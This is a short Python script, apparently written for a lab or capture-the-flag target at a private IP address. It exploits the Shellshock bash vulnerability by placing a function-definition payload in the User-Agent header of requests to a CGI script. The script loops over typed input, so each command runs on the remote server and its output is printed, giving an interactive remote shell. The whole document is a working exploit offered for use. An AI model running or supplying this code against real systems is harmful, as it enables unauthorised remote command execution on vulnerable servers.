import requests
#import base64

while True:
	cmd = input("> ")

	headers = {
	"User-Agent" : "() { :; }; echo 'Content-type: text/html'; echo; export PATH=/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; %s " %(cmd)
		}
	print((requests.get('http://192.168.130.203:591/cgi-bin/cat', headers=headers, timeout=5).text).strip())